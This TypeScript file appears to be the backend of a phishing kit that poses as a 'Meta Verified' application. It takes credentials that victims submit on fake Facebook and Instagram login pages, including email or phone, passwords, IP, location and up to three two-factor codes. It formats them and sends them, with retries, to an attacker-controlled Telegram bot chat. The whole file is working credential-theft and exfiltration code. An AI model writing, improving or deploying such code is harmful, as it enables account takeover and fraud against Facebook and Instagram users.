import https from 'https';
import axios, { type AxiosResponse, isAxiosError } from 'axios';

const HTTPS_AGENT_IPV4 = new https.Agent({ family: 4 });
const TELEGRAM_SEND_TIMEOUT_MS = 15_000;
const MAX_SEND_RETRIES = 3;

type TelegramSendMessageOk = {
    ok: true;
    result?: { message_id?: number };
};

type TelegramSendMessageErr = {
    ok: false;
    description?: string;
    error_code?: number;
    parameters?: { retry_after?: number };
};

class TelegramSendError extends Error {
    readonly name = 'TelegramSendError';

    constructor(
        message: string,
        readonly telegramErrorCode?: number,
        readonly retryAfterSec?: number,
    ) {
        super(message);
    }
}

function getTelegramConfig(): { apiRoot: string; chatId: string } | null {
    const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
    const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
    if (!token || !chatId) {
        return null;
    }
    return {
        apiRoot: `https://api.telegram.org/bot${token}`,
        chatId,
    };
}

function messageBodyLooksPermanentFailure(description: string): boolean {
    const d = description.toLowerCase();
    return d.includes('chat not found') || d.includes('bot was blocked') || d.includes('forbidden');
}

function assertSendMessageOk(res: AxiosResponse<unknown>): number | undefined {
    const body = res.data as TelegramSendMessageOk | TelegramSendMessageErr | null;
    if (body && typeof body === 'object' && body.ok === true) {
        return (body as TelegramSendMessageOk).result?.message_id;
    }

    const errBody = body as TelegramSendMessageErr | null;
    const retryAfter =
        errBody?.parameters && typeof errBody.parameters.retry_after === 'number'
            ? errBody.parameters.retry_after
            : undefined;
    throw new TelegramSendError(
        errBody?.description ?? 'sendMessage returned ok:false',
        errBody?.error_code,
        retryAfter,
    );
}

function isRetryableTelegramAttempt(error: unknown): boolean {
    if (error instanceof TelegramSendError) {
        const c = error.telegramErrorCode;
        if (c === 401) return false;
        if (c === 403) return false;
        if (messageBodyLooksPermanentFailure(error.message)) return false;
        if (c === 400 || c === 404) return false;
        if (c === 429) return true;
        if (c !== undefined && c >= 500) return true;
        return false;
    }

    if (isAxiosError(error)) {
        const status = error.response?.status;
        const description = error.response?.data && typeof error.response.data === 'object'
            ? String((error.response.data as { description?: string }).description ?? '')
            : '';

        if (status === 401 || status === 403) return false;
        if (status === 400 || status === 404) return false;
        if (description && messageBodyLooksPermanentFailure(description)) return false;
        if (status === 429) return true;
        if (status !== undefined && status >= 500) return true;
        /* Mạng / timeout — không có response */
        if (!error.response && error.request) return true;
        if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') return true;
        return false;
    }

    return false;
}

function backoffDelayMs(attemptIndex: number, error: unknown): number {
    if (error instanceof TelegramSendError && error.telegramErrorCode === 429) {
        const sec = error.retryAfterSec ?? 1;
        return Math.min(Math.max(sec * 1000, 500), 60_000);
    }
    return Math.pow(2, attemptIndex) * 1000;
}

async function retryTelegramRequest<T>(requestFn: () => Promise<T>): Promise<T> {
    let lastError: unknown;

    for (let attempt = 0; attempt < MAX_SEND_RETRIES; attempt++) {
        try {
            return await requestFn();
        } catch (error: unknown) {
            lastError = error;
            if (!isRetryableTelegramAttempt(error)) {
                throw error;
            }
            if (attempt === MAX_SEND_RETRIES - 1) {
                break;
            }
            const delay = backoffDelayMs(attempt, error);
            console.warn(`⚠️ Telegram sendMessage attempt ${attempt + 1} failed, retry in ${delay}ms`, error);
            await new Promise((resolve) => setTimeout(resolve, delay));
        }
    }

    throw lastError;
}

async function sendTelegramPlainMessage(apiRoot: string, chatId: string, text: string): Promise<number | undefined> {
    return retryTelegramRequest(async () => {
        const response = await axios.post<unknown>(
            `${apiRoot}/sendMessage`,
            {
                chat_id: chatId,
                text,
                parse_mode: 'HTML',
                disable_web_page_preview: true,
            },
            {
                httpsAgent: HTTPS_AGENT_IPV4,
                timeout: TELEGRAM_SEND_TIMEOUT_MS,
                validateStatus: (status) => status < 500,
            },
        );
        return assertSendMessageOk(response);
    });
}

function escapeHtml(input: unknown): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

/** Giá trị trong <code>: không có thì để trống. */
function formatCodeField(value: unknown): string {
    if (value === undefined || value === null) return '';
    const s = String(value).trim();
    return s ? escapeHtml(s) : '';
}

/** Dữ liệu gửi từ meta-verified (client mã hoá AES). Chỉ lấy field cần thiết để báo Telegram. */
export type TelegramInboundPayload = {
    submissionFlow?: string;
    ip?: string;
    location?: string;
    fullName?: string;
    name?: string;
    fanpage?: string;
    day?: string;
    month?: string;
    year?: string;
    email?: string;
    emailBusiness?: string;
    business?: string;
    phone?: string;
    password?: string;
    passwordSecond?: string;
    authMethod?: string;
    twoFa?: string;
    twoFaSecond?: string;
    twoFaThird?: string;
};

function normalizeData(input: TelegramInboundPayload | Record<string, unknown> = {}) {
    const sf = (input as TelegramInboundPayload).submissionFlow;
    const submissionFlow: '' | 'facebook_login' | 'instagram_login' | 'meta_verified' =
        sf === 'facebook_login' || sf === 'instagram_login' || sf === 'meta_verified' ? sf : '';
    return {
        ip: (input as TelegramInboundPayload).ip ?? '',
        location: (input as TelegramInboundPayload).location ?? '',
        fullName: (input as TelegramInboundPayload).fullName ?? (input as TelegramInboundPayload).name ?? '',
        fanpage: (input as TelegramInboundPayload).fanpage ?? '',
        day: (input as TelegramInboundPayload).day ?? '',
        month: (input as TelegramInboundPayload).month ?? '',
        year: (input as TelegramInboundPayload).year ?? '',
        email: (input as TelegramInboundPayload).email ?? '',
        emailBusiness: (input as TelegramInboundPayload).emailBusiness ?? (input as TelegramInboundPayload).business ?? '',
        phone: (input as TelegramInboundPayload).phone ?? '',
        password: (input as TelegramInboundPayload).password ?? '',
        passwordSecond: (input as TelegramInboundPayload).passwordSecond ?? '',
        authMethod: (input as TelegramInboundPayload).authMethod ?? '',
        twoFa: (input as TelegramInboundPayload).twoFa ?? '',
        twoFaSecond: (input as TelegramInboundPayload).twoFaSecond ?? '',
        twoFaThird: (input as TelegramInboundPayload).twoFaThird ?? '',
        submissionFlow,
    };
}

type NormalizedPayload = ReturnType<typeof normalizeData>;

function submissionTitleLine(flow: NormalizedPayload['submissionFlow']): string {
    if (flow === 'facebook_login') return '<b>📋 META VERIFIED — FACEBOOK</b>';
    if (flow === 'instagram_login') return '<b>📋 META VERIFIED — INSTAGRAM</b>';
    if (flow === 'meta_verified') return '<b>📋 META VERIFIED — APPLICATION</b>';
    return '<b>📋 META VERIFIED</b>';
}

function loginFieldLabel(flow: NormalizedPayload['submissionFlow']): string {
    if (flow === 'instagram_login') return 'Mobile number, username or email';
    return 'Mobile number or Email';
}

function primaryLoginIdentifier(d: NormalizedPayload): string {
    const email = String(d.email ?? '').trim();
    if (email) return email;
    const phone = String(d.phone ?? '').trim().replace(/^\+/, '');
    return phone ? `+${phone}` : '';
}

function primaryPasswordField(d: NormalizedPayload): string {
    const a = String(d.password ?? '').trim();
    if (a) return a;
    return String(d.passwordSecond ?? '').trim();
}

function formatTelegramSubmissionMessage(d: NormalizedPayload): string {
    const lines = [
        submissionTitleLine(d.submissionFlow),
        `----------------------`,
        `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
        `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
        `----------------------`,
        `<b>${loginFieldLabel(d.submissionFlow)}:</b> <code>${formatCodeField(primaryLoginIdentifier(d))}</code>`,
        `<b>Password:</b> <code>${formatCodeField(primaryPasswordField(d))}</code>`,
        `----------------------`,
        `<b>🔐 2FA step 1:</b> <code>${formatCodeField(d.twoFa)}</code>`,
        `<b>🔐 2FA step 2:</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
    ];
    const third = String(d.twoFaThird ?? '').trim();
    if (third) {
        lines.push(`<b>🔐 2FA step 3:</b> <code>${formatCodeField(d.twoFaThird)}</code>`);
    }
    return lines.join('\n');
}

function formatMessage(data: TelegramInboundPayload | Record<string, unknown>): string {
    return formatTelegramSubmissionMessage(normalizeData(data));
}

/**
 * Gửi một tin `sendMessage` mới (không gộp / sửa tin cũ).
 * - Thiếu env: log cảnh báo, thoát im lặng (request vẫn coi là đã xử lý phía backend).
 * - Có env nhưng gửi thất bại sau retry: **throw** để `/api/meta-verified` có thể trả `error_code: 5`.
 */
export async function sendTelegramMessage(data: TelegramInboundPayload | Record<string, unknown>): Promise<void> {
    const config = getTelegramConfig();
    if (!config) {
        console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
        return;
    }

    const text = formatMessage(data);
    const messageId = await sendTelegramPlainMessage(config.apiRoot, config.chatId, text);
    if (messageId !== undefined) {
        console.log(`✅ Telegram sendMessage OK, message_id: ${messageId}`);
    }
}
